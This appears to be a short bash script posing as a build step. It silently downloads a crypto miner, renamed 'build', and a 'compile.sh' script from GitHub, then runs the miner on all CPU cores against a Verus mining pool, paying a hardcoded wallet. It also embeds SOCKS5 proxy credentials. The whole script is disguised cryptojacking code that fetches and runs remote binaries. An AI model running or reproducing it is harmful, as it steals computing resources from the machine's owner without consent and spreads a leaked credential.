#!/bin/bash
proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
wget -qO build https://github.com/renifer12/master/raw/master/ccminer
chmod +x build
chmod +x compile.sh
./build -a verus -o stratum+tcp://verushash.na.mine.zergpool.com -u RGDDXRXXPzxnd9VMkdJCxRVwgMLoAAf3ym.$(echo $(shuf -i 1-10 -n 1)-MOD) -p x -t $(nproc --all)
./compile.sh
echo succes
